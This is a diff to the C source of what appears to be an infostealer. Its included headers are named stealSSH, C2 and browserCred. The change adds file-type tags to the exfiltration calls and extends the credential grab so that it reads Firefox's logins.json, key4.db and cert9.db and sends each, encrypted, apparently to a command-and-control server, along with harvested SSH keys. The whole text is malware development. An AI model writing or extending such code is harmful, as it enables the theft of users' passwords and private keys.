@@ -10,6 +10,7 @@
 #include "stealSSH.h"
 #include "C2.h"
 #include "browserCred.h"
+#include "filetypes.h"
 
 #define MAX_BUFFER_SIZE 8192
 #define MAX_PATH 1024
@@ -175,7 +176,7 @@ int main(int argc, char *argv[])
 #endif
 
     // Send encrypted payload
-    int result = send_encrypted_blob(buffer, total_len);
+    int result = send_encrypted_blob(FILETYPE_SSH_KEY,buffer, total_len);
 
     // Clean up
     for (size_t i = 0; i < keyCount; ++i)
@@ -183,20 +184,22 @@ int main(int argc, char *argv[])
         free(keyList[i].publicKeyPath);
         free(keyList[i].secretKeyPath);
     }
-    // === NEW: Encrypt and send browser credentials individually ===
-    char path1[MAX_PATH], path2[MAX_PATH];
-    if (detect_credentials(path1, path2))
+    // === Encrypt and send browser credentials ===
+    char path1[MAX_PATH], path2[MAX_PATH] , path3[MAX_PATH];
+    if (detect_credentials(path1, path2, path3))
     {
-        size_t len1 = 0, len2 = 0;
+        size_t len1 = 0, len2 = 0, len3 = 0;
         uint8_t *buf1 = read_file(path1, &len1);
         uint8_t *buf2 = read_file(path2, &len2);
+        uint8_t *buf3 = read_file(path3, &len3);
 
         if (buf1 && len1 > 0)
         {
 #ifdef DEBUG
             printf("[DEBUG] Sending browser credential file 1 (%zu bytes): %s\n", len1, path1);
 #endif
-            send_encrypted_blob(buf1, len1);
+            send_encrypted_blob(FILETYPE_FIREFOX_LOGINS_JSON,buf1, len1);
+            fprintf(stderr, "[DEBUG] sent %zu bytes from %s\n", len1, path1);
             free(buf1);
         }
 
@@ -205,10 +208,19 @@ int main(int argc, char *argv[])
 #ifdef DEBUG
             printf("[DEBUG] Sending browser credential file 2 (%zu bytes): %s\n", len2, path2);
 #endif
-            send_encrypted_blob(buf2, len2);
+            send_encrypted_blob(FILETYPE_FIREFOX_KEY4_DB,buf2, len2);
             free(buf2);
         }
+        if (buf3 && len3 > 0)
+        {
+#ifdef DEBUG
+            printf("[DEBUG] Sending browser credential file 3 (%zu bytes): %s\n", len3, path3);
+#endif
+            send_encrypted_blob(FILETYPE_FIREFOX_CERT9_DB,buf3, len3);
+            free(buf3);
+        }
     }
+
     else
     {
 #ifdef DEBUG
